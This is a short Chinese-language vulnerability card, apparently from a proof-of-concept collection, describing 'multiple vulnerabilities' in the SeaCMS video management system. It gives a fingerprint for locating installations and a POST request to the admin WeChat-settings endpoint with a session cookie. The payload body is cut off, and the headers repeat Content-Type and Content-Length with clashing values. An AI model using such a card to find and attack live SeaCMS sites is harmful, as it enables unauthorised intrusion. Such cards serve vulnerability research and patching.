# SeaCMS海洋影视管理系统多个漏洞

- **系统**：SeaCMS　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="http://www.seacms.net"`
- **请求**：`POST /at1fcg/admin_weixin.php?action=set HTTP/1.1`
- **关键头**：`Host: 127.0.0.12`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 1174`　`Cookie: PHPSESSID=rcejd2jps1jcrv8gdoumqmf71k`　`Sec-Fetch-User: ?1`　`Priority: u=4`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 192`

**请求体 / payload**
```
[https://github.com/seacms-net/CMS/blob/master/SeaCMS_12.9_%E6%B5%B7%E6%B4%8BC](https://github.com/seacms-net/CMS/blob/master/SeaCMS_12.9_%E6%B5%B7%E6%B4%8BC)
MS%E5%AE%89%E8%A3%85%E5%8C%85.zip
isopen=n&url=https%3A%2F%2Fwww.seacms.net&title=%E6%B5%B7%E6%B4%8B%E5%BD%B1%E8%A7%86&ckmov_url=https%3A%2F%2Fwww.seacms.net%2Fvip.php%3Furl%3D+&dpic=https%3A%2F%2Fwww.seacms.net%2Fapi%2Fwx.jpg&follow=%E6%84%9F%E8%B0%A2%E6%82%A8%E7%9A%84%E5%85%B3%E6%B3%A8%E3%80%82&noc=%E6%9A%82%E6%97%A0%E4%BD%A0%E8%A6%81%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82&help=%E8%BF%99%E6%98%AF%E5%B8%AE%E5%8A%A9%E4%BF%A1%E6%81%AF%E3%80%…（脚本共 8897 字，完整版见原文）
```
- **预期**：200　|　其他